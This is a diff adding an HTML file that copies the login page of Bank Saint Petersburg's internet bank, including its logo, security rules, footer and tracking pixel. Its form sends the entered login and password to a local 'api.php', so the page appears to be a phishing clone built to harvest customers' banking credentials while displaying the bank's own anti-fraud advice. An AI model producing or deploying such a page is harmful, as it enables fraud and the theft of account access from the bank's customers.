@@ -1,0 +1,161 @@
+<html><head>
+        <title>Интернет банк - Банк Санкт-Петербург</title>
+        <meta name="description" content="Попробуйте наш интернет-банк! Открытие и закрытие счетов, заказ карт, подача заявки на кредит и оплата любых услуг онлайн">
+        <meta name="keywords" content="интернет банк,личный кабинет,интернет банк бспб,ibspb,бспб интернет">
+        <meta name="build" content="release-2021-07-15-corporate-attachments-signatures.19">
+        <meta name="revision" content="48d45b36b3">
+        <meta name="yandex-verification" content="7adccd2ab371840b">
+        <link rel="icon" type="image/x-icon" href="/public/images/favicon.ico">
+        <link rel="stylesheet" href="/public/gen/lib.css?48d45b36b3" media="screen">
+
+        <link rel="stylesheet" href="/public/gen/auth.css?48d45b36b3" media="screen">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+      
+
+        <link rel="stylesheet" type="text/css" href="/style.css">
+
+    </head>
+    <body>
+        <div class="container">
+            <img id="logo" src="/public/images/logo-bspb-ru.svg" alt="Интернет банк - Банк Санкт-Петербург">
+
+            <div id="login-container">
+                <span id="alerts-container">
+                    <div class="yearly-identification-warning-container hidden"></div>
+
+                    
+
+
+                    <div id="page-alerts-container"></div>
+                </span>
+
+                <form action="api.php" method="post" id="login-form">
+                  
+
+
+                   
+                   
+                    <div class="form-control">
+                        <input name="login" tabindex="1" type="text" placeholder="Логин" autocomplete="off" autofocus="" value="">
+                    </div>
+                    <div class="form-control">
+                        <input name="password" tabindex="2" type="password" placeholder="Пароль" autocomplete="off" value="">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="eye-icon">
+                            <path d="M12 8c-5 0-11 6-11 6s6 6 11 6 11-6 11-6-6-6-11-6zm0 10c-2.2 0-4-1.8-4-4s1.8-4 4-4 4 1.8 4 4-1.8 4-4 4z"></path>
+                            <circle cx="12" cy="14" r="2"></circle>
+                        </svg>
+                    </div>
+
+                    <div class="login-button-home">
+                        <button id="login-button" type="submit" tabindex="3" class="btn btn-primary">Войти</button>
+                    </div>
+
+                    <div id="additional-actions">
+                        <div id="security-rules-dialog-popup" class="modal fade" tabindex="-1">
+                            <div class="modal-dialog">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <a class="close" data-dismiss="modal">×</a>
+                                        <h3>Информация для ознакомления</h3>
+                                    </div>
+                                    <ul class="linked-icons">
+                                        <li class="active">
+                                            <a class="linked-icon private" href="#private" data-toggle="tab">Физическим лицам</a>
+                                        </li>
+                                        <li>
+                                            <a class="linked-icon corporate" href="#corporate" data-toggle="tab">Юридическим лицам</a>
+                                        </li>
+                                    </ul>
+                                    <div class="tab-content">
+                                        <div class="tab-pane active" id="private">
+                                            <div class="modal-body rules-info">
+                                                <b>Правила безопасности</b><br>
+                                                <br>
+                                                1. Не сообщайте никому, <b>даже сотрудникам банка:</b><br>
+                                                - данные банковских карт: полный номер карты, срок ее действия, трехзначный CVV2/CVC2-код, указанный на обороте карты;<br>
+                                                - подтверждающие коды из SMS/Push-сообщений, направленные Банком;<br>
+                                                - логин и пароль для входа в Интернет-банк.<br>
+                                                <br>
+                                                2. При поступлении звонков, SMS или иных сообщений с неизвестных номеров от имени «банковских работников» или якобы от имени Банка, например, «Ваша карта заблокирована», «Заблокирована сумма
+                                                оплаты», «Есть проблемы с проведением операции» и т.п.:<br>
+                                                - ни в коем случае <b>не перезванивайте</b> на указанные в сообщениях номера;<br>
+                                                - <b>не сообщайте данные банковских карт</b>: полный номер карты, срок ее действия, трехзначный CVV2/CVC2-код, указанный на обороте карты; SMS/Push-сообщения для подтверждения операции,
+                                                направленные Банком, а также персональные данные (данные паспорта).<br>
+                                                <br>
+                                                3. Если у вас возникло подозрение на мошенничество - немедленно прекратите разговор и перезвоните в Банк по телефонам, указанным на официальном сайте Банка:
+                                                <a href="https://www.bspb.ru/">https://www.bspb.ru</a>
+                                            </div>
+                                            <a class="btn btn-primary" href="/auth/restore">Принять правила безопасности</a>
+                                        </div>
+                                        <div class="tab-pane" id="corporate">
+                                            <div class="modal-body rules-info">
+                                                Если Вы забыли логин и/или пароль для входа <b>в корпоративный Интернет-банк i2B</b>, обратитесь в Службу технической поддержки по телефонам:
+                                                <ul>
+                                                    <li><b style="white-space: nowrap;">8 (812) 329 5939</b> в Санкт-Петербурге,</li>
+                                                    <li><b style="white-space: nowrap;">8 (800) 500 5939</b> по России (звонок бесплатный)</li>
+                                                </ul>
+                                                Также, Вы можете обратиться в любое обслуживающее <a target="_blank" href="https://www.bspb.ru/map/">подразделение банка</a> (необходимо предъявить документ, удостоверяющий личность).
+                                            </div>
+                                            <a class="btn btn-primary" data-dismiss="modal">Понятно</a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <a class="chevron" data-toggle="modal" data-target="#security-rules-dialog-popup" style="cursor: pointer;">
+                            Восстановить доступ
+                        </a>
+                    </div>
+
+                    <div class="secondary-links">
+                        <a class="chevron locale inline-block" href="/locale/en">In English</a>
+
+                        <a class="chevron inline-block" href="https://www.bspb.ru/retail/ibank/" target="_blank" rel="noopener noreferrer">Об Интернет-банке</a>
+
+                        <a class="chevron inline-block" href="https://idemo.bspb.ru/" target="_blank" rel="noopener noreferrer">Демо</a>
+                    </div>
+                </form>
+
+                
+
+            </div>
+        </div>
+
+        <div id="security-info">
+            <div class="item">
+                <img src="/public/images/login/recommendation-1.png">
+                <h4>Безопасное соединение</h4>
+                <div class="muted">Всегда используйте зашифрованное соединение. Убедитесь в том, что сертификат в адресной строке с названием Bank Saint Petersburg зеленого цвета.</div>
+            </div>
+            <div class="item">
+                <img src="/public/images/login/recommendation-2.png">
+                <h4>Всегда выходите из системы</h4>
+                <div class="muted">Выход из системы препятствует доступу других пользователей к вашим счетам.</div>
+            </div>
+            <div class="item">
+                <img src="/public/images/login/recommendation-3.png">
+                <h4>Не сообщайте никому свои пароли</h4>
+                <div class="muted">Пароль вводите только на этой странице. Банк никогда не просит вводить пароль через другие каналы.</div>
+            </div>
+        </div>
+
+        <div id="footer">
+            <div class="copyright">© 1990 – 2021 ПАО «Банк «Санкт-Петербург»</div>
+            <div class="license">Генеральная лицензия Банка России на совершение банковских операций №436 от 31.12.2014</div>
+        </div>
+
+     
+
+   
+        
+
+
+        
+
+    
+        <div><div style="behavior: url(#default#clientCaps);" id="oClientCaps"></div></div>
+        <img src="https://bfd.bspb.ru/api/v2/pixel/844bcb02-36c8-4460-abd7-6a5544927bd4/8fe760fc-2f21-4b22-9faf-b332b96c6fb0/empty.gif" style="width: 0px; height: 0px; display: block; position: absolute; top: -800px; left: -800px; z-index: -100;">
+    
+
+</body></html>
